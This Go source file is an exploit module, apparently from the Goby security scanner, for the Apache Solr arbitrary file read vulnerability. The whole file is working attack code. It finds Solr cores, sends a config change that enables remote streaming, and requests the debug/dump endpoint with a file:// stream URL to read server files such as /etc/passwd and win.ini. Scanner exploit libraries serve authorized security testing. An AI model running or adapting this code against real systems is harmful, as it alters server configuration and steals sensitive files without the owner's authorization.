package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache Solr Arbitrary file read",
    "Description": "Apache Solr has an arbitrary file read vulnerability, which allows attackers to obtain sensitive files from the target server without authorization.",
    "Product": "Apache Solr",
    "Homepage": "https://solr.apache.org/",
    "DisclosureDate": "2021-03-18",
    "Author": "go0p",
    "FofaQuery": "app=\"Solr\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "createSelect",
            "value": "/etc/passwd,\\\\127.0.0.1\\c$\\Windows\\win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/solr/admin/cores?indexInfo=false&wt=json",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "responseHeader",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "fileread"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": [
            "Solr"
        ],
        "System": null,
        "Hardware": null
    },
    "PocId": "10173"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			coreNameRes, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/solr/admin/cores?indexInfo=false&wt=json")
			reg := regexp.MustCompile(`"name":"(.*?)",`)
			coreName := reg.FindStringSubmatch(coreNameRes.RawBody)
			// fmt.Println(coreName)
			if len(coreName) == 0 {
				return expResult
			}
			cfg1 := httpclient.NewPostRequestConfig("/solr/" + coreName[1] + "/config")
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-type", "application/json")
			cfg1.Data = "{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && strings.Contains(resp1.RawBody, "This response") {
				cfg2 := httpclient.NewPostRequestConfig("/solr/" + coreName[1] + "/debug/dump?param=ContentStreams")
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Data = "stream.url=file://" + stepLogs.Params["file"].(string)
				cfg2.Header.Store("Content-type", "application/x-www-form-urlencoded")
				if resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err2 == nil {
					// fmt.Sprintf(resp2.RawBody)
					reg := regexp.MustCompile(`(?s)"stream":"(.*)"}]`)
					stream := reg.FindStringSubmatch(resp2.RawBody)
					if len(stream) == 0 {
						reg := regexp.MustCompile(`(?s)name="stream">(.*?)</str>`)
						stream2 := reg.FindStringSubmatch(resp2.RawBody)
						if len(stream2) == 0 {
							return expResult
						} else {
							if strings.Contains(stepLogs.Params["file"].(string), "passwd") {
								expResult.Output = strings.Replace(stream2[1], "\\n", "\n", -1)

							} else {
								expResult.Output = strings.Replace(stream2[1], "\\r\\n", "\n", -1)

							}
							expResult.Success = true
						}
					} else {
						if strings.Contains(stepLogs.Params["file"].(string), "passwd") {
							expResult.Output = strings.Replace(stream[1], "\\n", "\n", -1)

						} else {
							expResult.Output = strings.Replace(stream[1], "\\r\\n", "\n", -1)

						}
						expResult.Success = true
					}

				}
			}
			return expResult
		},
	))
}
